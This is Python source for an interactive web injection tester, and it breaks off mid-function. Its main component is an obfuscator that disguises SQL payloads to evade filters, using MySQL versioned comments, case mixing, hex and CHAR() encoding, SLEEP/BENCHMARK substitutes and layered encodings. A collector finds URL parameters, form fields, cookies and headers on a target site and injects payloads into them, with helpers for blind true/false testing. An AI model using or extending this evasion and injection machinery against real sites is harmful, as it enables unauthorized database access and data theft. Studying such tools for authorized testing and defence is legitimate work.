import requests
from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urlunparse, urljoin
from urllib.parse import quote
import sys, os, re, time, hashlib, itertools
import importlib.util
from time import perf_counter
import json
from xml.sax.saxutils import escape as _xml_escape
import random
import base64


# Optional deps
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except Exception:
    HAS_BS4 = False

# Playwright (optional)
PW_AVAILABLE = True
try:
    from playwright.sync_api import sync_playwright
except Exception:
    PW_AVAILABLE = False


# ------------------- utils -------------------
def to_int_safe(s: str, min_val=None, max_val=None):
    fa = "۰۱۲۳۴۵۶۷۸۹"
    en = "0123456789"
    s = s.strip().translate(str.maketrans(fa, en))
    n = int(s)
    if min_val is not None and n < min_val: raise ValueError("out of range")
    if max_val is not None and n > max_val: raise ValueError("out of range")
    return n

def parse_multi_indices(s: str, max_len: int):
    """
    '1,3-5,7' -> [1,3,4,5,7]   (1-based indices)
    supports 'all', 'a', '*'
    """
    s = s.strip().lower()
    if s in ("all", "a", "*"):
        return list(range(1, max_len + 1))
    fa = "۰۱۲۳۴۵۶۷۸۹"
    en = "0123456789"
    s = s.translate(str.maketrans(fa, en))
    out = set()
    for part in s.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            l, r = part.split("-", 1)
            l, r = int(l), int(r)
            for i in range(min(l, r), max(l, r) + 1):
                if 1 <= i <= max_len: out.add(i)
        else:
            i = int(part)
            if 1 <= i <= max_len: out.add(i)
    return sorted(out)

def sql_escape(s: str) -> str:
    return s.replace("'", "''")

def escape_html(s: str) -> str:
    return (s.replace("&", "&amp;")
             .replace("<", "&lt;")
             .replace(">", "&gt;")
             .replace('"', "&quot;")
             .replace("'", "&#39;"))

def json_escape_str(s: str) -> str:
    # فقط بخش داخل کوتیشن JSON را می‌سازد (بدون کوتیشن‌های اطراف)
    return json.dumps(s)[1:-1]

def xml_escape_str(s: str) -> str:
    return _xml_escape(s, entities={"'": "&apos;", '"': "&quot;"})

def js_string_escape(s: str) -> str:
    # Escape ساده و کاربردی برای قرارگیری داخل رشته JS
    return (s.replace("\\", "\\\\")
             .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t")
             .replace("\"", "\\\"").replace("'", "\\'")
             .replace("<", "\\x3c").replace(">", "\\x3e").replace("&", "\\x26"))

def apply_context_escape(s: str, ctx: str) -> str:
    ctx = (ctx or "raw").lower()
    if ctx == "json":
        return json_escape_str(s)
    if ctx == "xml":
        return xml_escape_str(s)
    if ctx == "html":
        return escape_html(s)
    if ctx in ("js", "javascript"):
        return js_string_escape(s)
    return s  # raw


def default_folder_input(prompt_text: str):
    base = os.path.dirname(os.path.abspath(__file__))
    raw = input(prompt_text).strip()
    if not raw:
        return base
    if os.path.isabs(raw):
        return raw
    return os.path.join(base, raw)

def _short_hash(s: str):
    if not s:
        return "-"
    data = s[:65536].encode("utf-8", errors="ignore")
    return hashlib.sha1(data).hexdigest()[:10]

ENCODED_RX = re.compile(r"%[0-9A-Fa-f]{2}")

def looks_encoded(s: str) -> bool:
    """A very simple heuristic: has %HH patterns."""
    return bool(ENCODED_RX.search(s or ""))

def timed_send(ic, req, quiet: bool = False, tries_override: int = None):
    t0 = perf_counter()
    r = ic.send(req, quiet=quiet, tries_override=tries_override)
    dt = perf_counter() - t0
    return r, dt


# ------------------- Obfuscation helpers -------------------
class Obfuscator:
    def __init__(self, dbms=None):
        self.encoding_policy = None
        self.default_intensity = 0.5
        self.techniques = {
            "case_change": self._case_change,
            "inline_comments": self._inline_comments,
            "hex_encoding": self._hex_encoding,
            "char_encoding": self._char_encoding,
            "unicode_entities": self._unicode_entities,
            "xml_entities": self._xml_entities,
            "string_concat": self._string_concat,
            "parentheses": self._parentheses,
            "alternative_keywords": self._alternative_keywords,
            "whitespace_tricks": self._whitespace_tricks
        }
        self.safety_rules = {
            "preserve_token_boundaries": True,
            "max_length_increase": 2.0,
            "forbidden_patterns": [r"\/\*!\d+", r"--\s*[^\s]"],
            "preserve_key_positions": ["SELECT", "FROM", "WHERE", "UNION"]
        }
        self.token_boundaries = {
            "start": ["'", "\"", "(", " ", "\t", "\n", ",", "=", "<", ">"],
            "end": ["'", "\"", ")", " ", "\t", "\n", ",", ";", "--", "#", "/*"]
        }

        # DBMS-specific configurations
        self.dbms_config = {
            "MySQL": {
                "comment_style": ["/**/", "#", "-- ", "-- -", "/*!00000", "/*!50000", "/*! */"],
                "string_concat": ["CONCAT", "||", " ", "+"],
                "alternative_keywords": {
                    "SELECT": ["SELECT", "SeLeCt", "SELECt", "select", "/*!SELECT*/", "/*!50000SELECT*/"],
                    "FROM": ["FROM", "FrOm", "from", "/*!FROM*/"],
                    "WHERE": ["WHERE", "WhErE", "where", "/*!WHERE*/", "WHERE/*!50000*/"],
                    "UNION": ["UNION", "UnIoN", "union", "/*!UNION*/", "UNiOn all", "UNiOn distinct"],
                    "OR": ["OR", "||", "or", "/*!OR*/", "Or"],
                    "AND": ["AND", "&&", "and", "/*!AND*/", "And", "aND"],
                    "INSERT": ["INSERT", "insert", "/*!INSERT*/", "iNsErT"],
                    "UPDATE": ["UPDATE", "update", "/*!UPDATE*/", "UpDaTe"],
                    "DELETE": ["DELETE", "delete", "/*!DELETE*/", "DeLeTe"],
                    "EXEC": ["EXEC", "exec", "EXECUTE", "execute", "/*!EXEC*/"],
                    "SLEEP": ["SLEEP", "sleep", "/*!SLEEP*/", "BENCHMARK", "benchmark"],
                    "INFORMATION_SCHEMA": ["INFORMATION_SCHEMA", "information_schema", "/*!INFORMATION_SCHEMA*/", "infoschema"]
                },
                "functions": {
                    "version": ["version()", "@@version", "/*!version*/()"],
                    "user": ["user()", "current_user()", "system_user()", "/*!user*/()"],
                    "database": ["database()", "/*!database*/()"],
                    "concat": ["CONCAT", "CONCAT_WS", "GROUP_CONCAT", "/*!CONCAT*/"]
                }
            },
            "PostgreSQL": {
                "comment_style": ["/**/", "-- ", "-- -"],
                "string_concat": ["||", "CONCAT", " "],
                "alternative_keywords": {
                    "SELECT": ["SELECT", "select", "SeLeCt"],
                    "FROM": ["FROM", "from", "FrOm"],
                    "WHERE": ["WHERE", "where", "WhErE"],
                    "UNION": ["UNION", "union", "UnIoN", "UNION ALL", "UNION DISTINCT"],
                    "OR": ["OR", "or", "Or"],
                    "AND": ["AND", "and", "aND"],
                    "CURRENT_DATABASE": ["CURRENT_DATABASE", "current_database"],
                    "VERSION": ["VERSION", "version"]
                }
            },
        }
        # Set dbms AFTER dbms_config is defined so the validation works correctly
        self.dbms = dbms if (dbms and dbms in self.dbms_config) else "MySQL"

    def _is_token_boundary(self, text, position):
        if position == 0 or position == len(text) - 1:
            return True
            
        prev_char = text[position-1]
        next_char = text[position+1] if position + 1 < len(text) else ""
        
        return (prev_char in self.token_boundaries["start"] or 
                next_char in self.token_boundaries["end"])

    def _preserve_keyword_positions(self, text, keyword):
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        positions = []
        
        for match in pattern.finditer(text):
            start, end = match.span()
            if (start == 0 or text[start-1] in self.token_boundaries["start"]) and \
            (end == len(text) or text[end] in self.token_boundaries["end"]):
                positions.append((start, end))
        
        return positions

    def obfuscate_advanced(self, payload, techniques=None, intensity=0.5, 
                        max_iterations=3, char_budget=None):
        
        if not techniques:
            techniques = list(self.techniques.keys())
            
        current = payload
        applied_techniques = []
        original_length = len(payload)
        
        max_allowed_length = original_length * self.safety_rules["max_length_increase"]
        if char_budget:
            max_allowed_length = min(max_allowed_length, original_length + char_budget)
        
        preserved_positions = {}
        for keyword in self.safety_rules["preserve_key_positions"]:
            preserved_positions[keyword] = self._preserve_keyword_positions(current, keyword)
        
        for iteration in range(max_iterations):
            if len(current) > max_allowed_length:
                break
                
            technique_name = random.choice(techniques)
            if random.random() < intensity:
                technique = self.techniques[technique_name]
                new_payload = technique(current, intensity)
                
                if self.safety_rules["preserve_token_boundaries"]:
                    pass
                    
                if any(re.search(pattern, new_payload) for pattern in self.safety_rules["forbidden_patterns"]):
                    continue
                    
                if new_payload != current:
                    current = new_payload
                    applied_techniques.append(technique_name)
        
        if hasattr(self, 'encoding_policy') and self.encoding_policy:
            current = self._apply_encoding_layers(current, self.encoding_policy)
        
        return current, applied_techniques

    def _apply_encoding_layers(self, text, encoding_policy=None):
        
        if not encoding_policy:
            return text
        
        result = text
        for encoding_type in encoding_policy:
            if encoding_type == "url":
                result = quote(result, safe="")
            elif encoding_type == "html":
                result = escape_html(result)
            elif encoding_type == "base64":
                result = base64.b64encode(result.encode()).decode()
            elif encoding_type == "hex":
                result = "".join([f"%{ord(c):02x}" for c in result])
            elif encoding_type == "unicode":
                result = "".join([f"&#{ord(c)};" for c in result])
            elif encoding_type == "double_url":
                result = quote(quote(result, safe=""), safe="")
        
        return result

    def set_encoding_policy(self, policy):
        """Set default encoding policy for all obfuscations"""
        self.encoding_policy = policy

    def _get_default_config(self):
        """Return dbms_config if available, else empty dict (used before dbms_config is set)."""
        return getattr(self, "dbms_config", {})

    def _safe_config(self):
        """Return config for current DBMS, falling back to MySQL."""
        dbms = self.dbms if self.dbms in self.dbms_config else "MySQL"
        return self.dbms_config[dbms]

    def set_dbms(self, dbms):
        self.dbms = dbms if dbms in self.dbms_config else "MySQL"

    def _case_change(self, text, intensity=0.5):
        """Random case changing with intensity control"""
        result = []
        for char in text:
            if char.isalpha() and random.random() < intensity:
                result.append(char.lower() if char.isupper() else char.upper())
            else:
                result.append(char)
        return ''.join(result)

    def _inline_comments(self, text, intensity=0.3):
        """Add random inline comments"""
        if not text.strip():
            return text

        config = self._safe_config()
        words = text.split()
        result = []
        
        for i, word in enumerate(words):
            result.append(word)
            if random.random() < intensity and i < len(words) - 1:
                comment = random.choice(config["comment_style"])
                result.append(comment)
                
        return ' '.join(result)

    def _hex_encoding(self, text, intensity=0.2):
        """Convert parts to hex encoding"""
        if len(text) < 3:
            return text
            
        result = []
        i = 0
        while i < len(text):
            if random.random() < intensity and i + 2 < len(text):
                # Encode 2-4 characters as hex
                length = random.randint(2, 4)
                segment = text[i:i+length]
                hex_segment = ''.join([f"{ord(c):02x}" for c in segment])
                result.append(f"0x{hex_segment}")
                i += length
            else:
                result.append(text[i])
                i += 1
                
        return ''.join(result)

    def _char_encoding(self, text, intensity=0.2):
        """Convert to CHAR() encoding"""
        if not text:
            return text
            
        result = []
        for char in text:
            if random.random() < intensity and char.isprintable():
                if self.dbms == "MySQL":
                    result.append(f"CHAR({ord(char)})")
                elif self.dbms == "MSSQL":
                    result.append(f"CHAR({ord(char)})")
                else:
                    result.append(char)
            else:
                result.append(char)
                
        return ''.join(result)

    def _unicode_entities(self, text, intensity=0.1):
        """Convert to Unicode entities"""
        result = []
        for char in text:
            if random.random() < intensity:
                result.append(f"&#{ord(char)};")
            else:
                result.append(char)
        return ''.join(result)

    def _xml_entities(self, text, intensity=0.1):
        """Convert to XML entities"""
        xml_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '&': '&amp;',
            '"': '&quot;',
            "'": '&apos;'
        }
        
        result = []
        for char in text:
            if random.random() < intensity and char in xml_entities:
                result.append(xml_entities[char])
            else:
                result.append(char)
        return ''.join(result)

    def _string_concat(self, text, intensity=0.3):
        """Break strings using concatenation"""
        if len(text) < 4:
            return text

        config = self._safe_config()
        concat_op = random.choice(config["string_concat"])
        
        parts = []
        current = ""
        for char in text:
            if random.random() < intensity and current:
                parts.append(f"'{current}'")
                current = ""
            current += char
        
        if current:
            parts.append(f"'{current}'")
            
        if len(parts) > 1:
            return concat_op.join(parts)
        return text

    def _parentheses(self, text, intensity=0.4):
        """Add extra parentheses"""
        words = text.split()
        if len(words) < 2:
            return text
            
        result = []
        open_count = 0
        
        for i, word in enumerate(words):
            if random.random() < intensity and open_count == 0:
                result.append(f"({word}")
                open_count += 1
            elif random.random() < intensity and open_count > 0 and i > 0:
                result.append(f"{word})")
                open_count -= 1
            else:
                result.append(word)
                
        # Close any open parentheses
        while open_count > 0:
            result[-1] = result[-1] + ")"
            open_count -= 1
            
        return ' '.join(result)

    def _alternative_keywords(self, text, intensity=0.3):
        """Use alternative keywords"""
        config = self._safe_config()
        words = text.split()
        result = []
        
        for word in words:
            upper_word = word.upper()
            if upper_word in config["alternative_keywords"] and random.random() < intensity:
                result.append(random.choice(config["alternative_keywords"][upper_word]))
            else:
                result.append(word)
                
        return ' '.join(result)

    def _whitespace_tricks(self, text, intensity=0.5):
        """Add random whitespace"""
        result = []
        for char in text:
            result.append(char)
            if random.random() < intensity:
                # Add random whitespace
                whitespace = random.choice([' ', '\t', '\n', '\r', '\x0b', '\x0c'])
                result.append(whitespace)
                
        return ''.join(result)

    def obfuscate(self, payload, techniques=None, intensity=0.5, max_iterations=3):
        if not techniques:
            techniques = list(self.techniques.keys())

        current = payload
        applied_techniques = []

        for _ in range(max_iterations):
            technique_name = random.choice(techniques)
            if random.random() < intensity:
                technique = self.techniques[technique_name]
                new_payload = technique(current, intensity)
                if new_payload != current:
                    current = new_payload
                    applied_techniques.append(technique_name)

        # Apply encoding policy (same as obfuscate_advanced)
        if hasattr(self, 'encoding_policy') and self.encoding_policy:
            current = self._apply_encoding_layers(current, self.encoding_policy)

        return current, applied_techniques

    def generate_variants(self, payload, count=5, techniques=None, intensity=0.5):
        """Generate multiple obfuscated variants"""
        variants = []
        for i in range(count):
            variant, techniques_used = self.obfuscate(payload, techniques, intensity)
            variants.append({
                "payload": variant,
                "techniques": techniques_used,
                "label": f"obf_{i+1}"
            })
        return variants


# ---------- placeholder helpers ----------
PLACEHOLDER_RX = re.compile(r"\{([A-Za-z_][A-Za-z0-9_]*)\}")

def find_placeholders_in_string(s: str):
    return list(dict.fromkeys(PLACEHOLDER_RX.findall(str(s) or "")))

def find_placeholders_in_dict(d: dict):
    found = []
    for v in d.values():
        found += find_placeholders_in_string(v)
    out = []
    for x in found:
        if x not in out:
            out.append(x)
    return out

def parse_list_or_single(prompt_txt: str):
    """
    Input:
      - "abc" -> ["abc"]
      - "[a,b,c]" -> ["a","b","c"]
      - "" -> []
    """
    raw = input(prompt_txt).strip()
    if not raw:
        return []
    if raw.startswith("[") and raw.endswith("]"):
        inner = raw[1:-1]
        items = [i.strip() for i in inner.split(",") if i.strip() != ""]
        return items
    return [raw]

def expand_one_payload_string(s: str, var_map: dict):
    vars_in = find_placeholders_in_string(s)
    if not vars_in:
        return [("", s)]
    lists = []
    for v in vars_in:
        vals = var_map.get(v, [])
        if not vals:
            print(f"[!] No value provided for placeholder {{{v}}}, skipping this payload.")
            return []
        lists.append([(v, val) for val in vals])
    combos = list(itertools.product(*lists))
    out = []
    for combo in combos:
        filled = s
        parts = []
        for (vn, vv) in combo:
            filled = filled.replace("{"+vn+"}", str(vv))
            parts.append(f"{vn}={vv}")
        label_suffix = "|".join(parts)
        out.append((label_suffix, filled))
    return out

def expand_payload_dict(payload_dict: dict):
    vars_all = find_placeholders_in_dict(payload_dict)
    var_map = {}
    for v in vars_all:
        vals = parse_list_or_single(f"Value(s) for placeholder {{{v}}} (single or [a,b,c]): ")
        if not vals:
            print(f"[!] No values entered for {{{v}}}. This var will be skipped in expansions.")
        var_map[v] = vals

    expanded = {}
    for label, s in payload_dict.items():
        variants = expand_one_payload_string(s, var_map)
        if not variants:
            continue
        for label_suffix, filled in variants:
            new_label = label if not label_suffix else f"{label}|{label_suffix}"
            expanded[new_label] = filled
    return expanded

def expand_single_payload_string(s: str):
    vars_in = find_placeholders_in_string(s)
    if not vars_in:
        return {"p0": s}
    var_map = {}
    for v in vars_in:
        vals = parse_list_or_single(f"Value(s) for placeholder {{{v}}} (single or [a,b,c]): ")
        if not vals:
            print(f"[!] No values entered for {{{v}}}. Skipping.")
            return {}
        var_map[v] = vals
    out = {}
    for label_suffix, filled in expand_one_payload_string(s, var_map):
        new_label = "p0" if not label_suffix else f"p0|{label_suffix}"
        out[new_label] = filled
    return out


# -------- NEW: helpers for Blind mode --------
def eval_by_tester_mode(body: str, tester: str, mode: str) -> bool:
    """
    mode: 'success' => presence means True
          'error'   => absence means True
    """
    if not tester:
        return False
    has = tester.lower() in (body or "").lower()
    if mode == "success":
        return has
    if mode == "error":
        return not has
    return False

def prompt_placeholder_plan(vars_all):
    
    plan = {}
    print("\n[Placeholder setup]")
    first_multi_chosen = False
    for v in vars_all:
        vals = []
        while not vals:
            raw = input(f"Value(s) for {{{v}}} (single or [a,b,c]): ").strip()
            if not raw:
                print("  - Empty; please enter something.")
                continue
            if raw.startswith("[") and raw.endswith("]"):
                inner = raw[1:-1]
                vals = [i.strip() for i in inner.split(",") if i.strip() != ""]
            else:
                vals = [raw]

        start = 0
        if len(vals) > 1:
            while True:
                sraw = input(f"Start index for {{{v}}} (default 0): ").strip()
                try:
                    start = int(sraw) if sraw else 0
                    if not (0 <= start < len(vals)):
                        print(f"  - Must be 0..{len(vals)-1}")
                        continue
                    break
                except:
                    print("  - Not a number.")

        if len(vals) <= 1:
            strat = "exhaustive"
        else:
            if not first_multi_chosen:
                strat = "exhaustive"
                first_multi_chosen = True
            else:
                strat = "findfirst"
        plan[v] = {"values": vals, "start": start, "strategy": strat}

    return plan, []  # concat progress removed

def select_labels_by_number(label_map: dict):
    labels = list(label_map.keys())
    print("\nPayload labels:")
    for i, lb in enumerate(labels, start=1):
        print(f"{i}. {lb}")
    print("Select indices (e.g., 1,3-4 or 'all'): ")
    sel = input("> ").strip().lower()
    if sel in ("all","*","a",""):
        return {lb: label_map[lb] for lb in labels}
    fa = "۰۱۲۳۴۵۶۷۸۹"; en = "0123456789"
    sel = sel.translate(str.maketrans(fa,en))
    chosen = set()
    try:
        for part in sel.split(","):
            part = part.strip()
            if not part: continue
            if "-" in part:
                l,r = part.split("-",1)
                l,r = int(l), int(r)
                for i in range(min(l,r),max(l,r)+1):
                    if 1<=i<=len(labels): chosen.add(i-1)
            else:
                i = int(part)
                if 1<=i<=len(labels): chosen.add(i-1)
    except:
        print("[!] Invalid selection. Using all labels.")
        return {lb: label_map[lb] for lb in labels}
    subset = {}
    for i in sorted(chosen):
        subset[labels[i]] = label_map[labels[i]]
    if not subset:
        print("[!] Empty selection. Using all labels.")
        return {lb: label_map[lb] for lb in labels}
    return subset


# ------------------- core -------------------
class InputCollector:

    def __init__(self, url, timeout=30):
        self.timeout = timeout
        self.session = requests.Session()
        self.injection_mode = "append"  # or "replace"
        self.encode_cookies = "auto"   # "auto" | "encode" | "raw"
        self.encode_headers = "auto"   # "auto" | "encode" | "raw"
        self.set_url(url)
        self.context_mode = "raw"  # raw | json | xml | html | js

    def preview_transform(self, key: str, payload_str: str):
        raw = str(payload_str)
        ctx = apply_context_escape(raw, getattr(self, "context_mode", "raw"))
        pt = self.prepared_data["type"] if self.prepared_data else None
        final = ctx

        try:
            if pt == "url":
                parsed = self.prepared_data["parsed"]
                params = {k: v[:] for k, v in self.prepared_data["params"].items()}
                orig = self.original_values.get(key, "")
                val  = (orig + ctx) if (self.injection_mode == "append") else ctx
                params[key] = [val]
                new_query = urlencode(params, doseq=True)
                final_url = urlunparse(parsed._replace(query=new_query))
                final = final_url

            elif pt == "post":
                fields = self.prepared_data["fields"].copy()
                orig = self.original_values.get(key, "")
                val  = (orig + ctx) if (self.injection_mode == "append") else ctx
                fields[key] = val
                method = self.prepared_data.get("method", "POST").upper()
                action_url = self.prepared_data.get("action_url", self.url)
                if method == "GET":
                    parsed = urlparse(action_url)
                    base_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
                    base_params.update(fields)
                    new_query = urlencode(base_params, doseq=True)
                    final = urlunparse(parsed._replace(query=new_query))
                else:
                    final = f"{action_url} | data=" + urlencode(fields)

            elif pt == "cookie":
                cookies = self.prepared_data["cookies"].copy()
                orig = str(self.original_values.get(key, ""))
                use_encode = (
                    self.encode_cookies == "encode" or
                    (self.encode_cookies == "auto" and looks_encoded(orig))
                )
                payload_piece = quote(ctx, safe="") if use_encode else ctx
                val = (orig + payload_piece) if (self.injection_mode == "append") else payload_piece
                cookies[key] = val
                final = f"{self.url} | Cookie {key}={cookies[key]}"

            elif pt == "header":
                headers = self.prepared_data["headers"].copy()
                orig = str(self.original_values.get(key, ""))
                use_encode = (
                    self.encode_headers == "encode" or
                    (self.encode_headers == "auto" and looks_encoded(orig))
                )
                payload_piece = quote(ctx, safe="") if use_encode else ctx
                val = (orig + payload_piece) if (self.injection_mode == "append") else payload_piece
                headers[key] = val
                final = f"{self.url} | Header {key}: {headers[key]}"

        except Exception as e:
            final = f"[preview-error] {e}"

        return {"RAW": raw, "CTX": ctx, "FINAL": final}


    def set_context_mode(self, mode: str):
        mode = (mode or "raw").lower()
        if mode not in {"raw", "json", "xml", "html", "js"}:
            print("[-] Invalid context mode. Using raw.")
            mode = "raw"
        self.context_mode = mode
        print(f"[*] context_mode -> {self.context_mode}")


    def set_url(self, url):
        if not (url.startswith("http://") or url.startswith("https://")):
            raise ValueError("URL must start with http:// or https://")
        self.url = url
        self.response = None
        try:
            self.response = self.session.get(self.url, timeout=self.timeout)
        except Exception as e:
            print(f"[-] Initial GET failed: {e}")
        self.target_type = None
        self.selected_keys = []
        self.original_values = {}
        self.prepared_data = None

    # -------- menus --------
    def choose_target_type(self):
        while True:
            print("\nSelect target to test:")
            print("1. URL Parameter")
            print("2. POST Field (auto-discover forms)")
            print("3. Cookie")
            print("4. Header")
            print("9. Back")
            print("0. Cancel")
            try:
                choice = to_int_safe(input("Your choice: "), 0, 9)
            except Exception:
                print("[-] Invalid number. Try again.")
                continue
            if choice == 0: return None
            if choice == 9: return "back"
            self.target_type = choice
            return choice

    def collect_inputs(self):
        if self.target_type == 1:
            return self._collect_url_params()
        elif self.target_type == 2:
            return self._collect_post_fields()
        elif self.target_type == 3:
            return self._collect_cookies()
        elif self.target_type == 4:
            return self._collect_headers()
        else:
            print("[-] No target type selected.")
            return False

    # -------- collectors --------
    def _collect_url_params(self):
        parsed = urlparse(self.url)
        params = {k: v[:] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
        keys = list(params.keys())
        if not keys:
            print("No URL parameters found.")
            ans = input("Add a new query parameter? (y/n): ").strip().lower()
            if ans == "y":
                k = input("Param name: ").strip()
                v = input("Param value: ").strip()
                params = {k: [v]}
                keys = [k]
            else:
                return False

        print("\nURL Parameters:")
        for i, k in enumerate(keys, start=1):
            print(f"{i}. {k} = {params[k]}")
        print("Select one/many (e.g., 1,3-4 or 'all')  |  9: Back  |  0: Cancel")
        sel = input("Indices: ").strip()
        if sel in ("9", "۹"): return "back"
        if sel in ("0", "۰"): return False
        try:
            indices = parse_multi_indices(sel, len(keys))
        except Exception:
            print("[-] Invalid selection.")
            return False
        if not indices:
            print("[-] Nothing selected.")
            return False

        self.selected_keys = [keys[i-1] for i in indices]
        self.original_values = {k: (params[k][0] if params[k] else "") for k in self.selected_keys}
        self.prepared_data = {"type": "url", "params": params, "parsed": parsed}
        return True

    def _discover_forms(self):
        if not HAS_BS4:
            print("[-] BeautifulSoup not installed. Run: pip install beautifulsoup4")
            return []
        if not self.response:
            try:
                self.response = self.session.get(self.url, timeout=self.timeout)
            except Exception as e:
                print(f"[-] GET failed for form discovery: {e}")
                return []
        soup = BeautifulSoup(self.response.text, "html.parser")
        forms = soup.find_all("form")
        results = []
        for f in forms:
            method = (f.get("method") or "GET").upper()
            action = f.get("action") or self.url
            action_abs = urljoin(self.url, action)

            fields = {}
            for inp in f.find_all("input"):
                name = inp.get("name")
                if not name: continue
                value = inp.get("value", "")
                fields[name] = value
            for ta in f.find_all("textarea"):
                name = ta.get("name")
                if not name: continue
                value = ta.text or ""
                fields[name] = value
            for sel in f.find_all("select"):
                name = sel.get("name")
                if not name: continue
                val = ""
                options = sel.find_all("option")
                if options:
                    sel_opt = next((o for o in options if o.get("selected")), options[0])
                    val = sel_opt.get("value", sel_opt.text)
                fields[name] = val

            results.append({"method": method, "action": action_abs, "inputs": fields, "form": f})
        return results

    def _collect_post_fields(self):
        forms = self._discover_forms()
        if not forms:
            print("[-] No forms found.")
            return False

        print(f"[+] Found {len(forms)} form(s):")
        for i, f in enumerate(forms, start=1):
            print(f"{i}. Method={f['method']} | Action={f['action']} | Fields={list(f['inputs'].keys())}")

        print("Pick a form (number)  |  9: Back  |  0: Cancel")
        sel = input("> ").strip()
        if sel in ("9", "۹"): return "back"
        if sel in ("0", "۰"): return False
        try:
            idx = to_int_safe(sel, 1, len(forms)) - 1
        except Exception:
            print("[-] Invalid selection.")
            return False

        selected = forms[idx]
        fields = selected["inputs"]
        if not fields:
            print("[-] This form has no named fields.")
            return False

        keys = list(fields.keys())
        print("\n[+] Fields:")
        for i, k in enumerate(keys, start=1):
            print(f"{i}. {k} = {fields[k]}")
        print("Select one/many (e.g., 1,2-3 or 'all')  |  9: Back  |  0: Cancel")
        sel2 = input("Indices: ").strip()
        if sel2 in ("9", "۹"): return "back"
        if sel2 in ("0", "۰"): return False
        try:
            indices = parse_multi_indices(sel2, len(keys))
        except Exception:
            print("[-] Invalid selection.")
            return False
        if not indices:
            print("[-] Nothing selected.")
            return False

        self.selected_keys = [keys[i-1] for i in indices]
        self.original_values = {k: fields[k] for k in self.selected_keys}
        self.prepared_data = {
            "type": "post",
            "fields": fields.copy(),
            "method": selected["method"],
            "action_url": selected["action"]
        }
        return True

    def _collect_cookies(self):
        cookies_dict = {}
        try:
            if self.response is None:
                self.response = self.session.get(self.url, timeout=self.timeout)
            cookies_dict = self.response.cookies.get_dict()
        except Exception as e:
            print(f"[-] Could not fetch cookies: {e}")
        if not cookies_dict:
            print("[-] No cookies found in session.")
            ans = input("Add a cookie manually? (y/n): ").strip().lower()
            if ans != "y":
                return False
            k = input("Cookie name: ").strip()
            v = input("Cookie value: ").strip()
            if not k:
                print("[-] Empty name.")
                return False
            cookies_dict = {k: v}

        keys = list(cookies_dict.keys())
        print("\nCookies:")
        for i, k in enumerate(keys, start=1):
            print(f"{i}. {k} = {cookies_dict[k]}")
        print("Select one/many (e.g., 1,3-4 or 'all')  |  8: Add custom  |  9: Back  |  0: Cancel")
        while True:
            sel = input("Indices: ").strip()
            if sel in ("9", "۹"): return "back"
            if sel in ("0", "۰"): return False
            if sel in ("8", "۸"):
                ck = input("Cookie name: ").strip()
                cv = input("Cookie value: ").strip()
                if ck:
                    cookies_dict[ck] = cv
                    keys = list(cookies_dict.keys())
                    print(f"[+] Added cookie: {ck}={cv}")
                    for i, k in enumerate(keys, start=1):
                        print(f"{i}. {k} = {cookies_dict[k]}")
                continue
            try:
                indices = parse_multi_indices(sel, len(keys))
            except Exception:
                print("[-] Invalid selection.")
                continue
            if not indices:
                print("[-] Nothing selected.")
                continue
            break

        self.selected_keys = [keys[i-1] for i in indices]
        self.original_values = {k: cookies_dict[k] for k in self.selected_keys}
        self.prepared_data = {"type": "cookie", "cookies": cookies_dict.copy()}
        return True

    def _collect_headers(self):
        default_headers = {
            "User-Agent": (self.response.request.headers.get("User-Agent") if self.response else "Mozilla/5.0") or "Mozilla/5.0",
            "Referer": self.url
        }
        keys = list(default_headers.keys()) + ["(custom)"]

        while True:
            print("\nHeaders:")
            for i, k in enumerate(keys, start=1):
                if k == "(custom)":
                    print(f"{i}. {k}")
                else:
                    print(f"{i}. {k} = {default_headers[k]}")
            print("Select one/many (e.g., 1,2 or 'all')  |  8: Add custom  |  9: Back  |  0: Cancel")
            sel = input("Indices: ").strip()
            if sel in ("9", "۹"): return "back"
            if sel in ("0", "۰"): return False
            if sel in ("8", "۸"):
                hk = input("Header name: ").strip()
                hv = input("Header value: ").strip()
                if hk:
                    default_headers[hk] = hv
                    keys = list(default_headers.keys()) + ["(custom)"]
                continue
            try:
                indices = parse_multi_indices(sel, len(keys))
            except Exception:
                print("[-] Invalid selection.")
                continue
            indices = [i for i in indices if i <= len(keys)-1]
            if not indices:
                print("[-] Nothing selected.")
                continue

            self.selected_keys = [list(default_headers.keys())[i-1] for i in indices]
            self.original_values = {k: default_headers[k] for k in self.selected_keys}
            self.prepared_data = {"type": "header", "headers": default_headers.copy()}
            return True

    # -------- builder --------
    def _build_one(self, key, payload_str):
        pt = self.prepared_data["type"]
        p = str(payload_str)
        # 1) Context escape (RAW -> JSON/XML/HTML/JS)
        p_ctx = apply_context_escape(p, getattr(self, "context_mode", "raw"))
        try:
            if pt == "url":
                params = {k: v[:] for k, v in self.prepared_data["params"].items()}
                orig = self.original_values.get(key, "")
                val  = (orig + p_ctx) if (self.injection_mode == "append") else p_ctx
                params[key] = [val]
                new_query = urlencode(params, doseq=True)
                new_url = urlunparse(self.prepared_data["parsed"]._replace(query=new_query))
                return {"url": new_url, "method": "GET"}

            if pt == "post":
                fields = self.prepared_data["fields"].copy()
                orig = self.original_values.get(key, "")
                val  = (orig + p_ctx) if (self.injection_mode == "append") else p_ctx
                fields[key] = val
                method = self.prepared_data.get("method", "POST").upper()
                action_url = self.prepared_data.get("action_url", self.url)
                if method == "GET":
                    parsed = urlparse(action_url)
                    base_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
                    base_params.update(fields)
                    new_query = urlencode(base_params, doseq=True)
                    new_url = urlunparse(parsed._replace(query=new_query))
                    return {"url": new_url, "method": "GET"}
                return {"url": action_url, "method": "POST", "data": fields}

            if pt == "cookie":
                cookies = self.prepared_data["cookies"].copy()
                orig = str(self.original_values.get(key, ""))
                use_encode = (
                    self.encode_cookies == "encode" or
                    (self.encode_cookies == "auto" and looks_encoded(orig))
                )
                payload_piece = quote(p_ctx, safe="") if use_encode else p_ctx
                val = (orig + payload_piece) if (getattr(self, "injection_mode", "append") == "append") else payload_piece
                cookies[key] = val
                return {"url": self.url, "method": "GET", "cookies": cookies}


            if pt == "header":
                headers = self.prepared_data["headers"].copy()
                orig = str(self.original_values.get(key, ""))
                use_encode = (
                    self.encode_headers == "encode" or
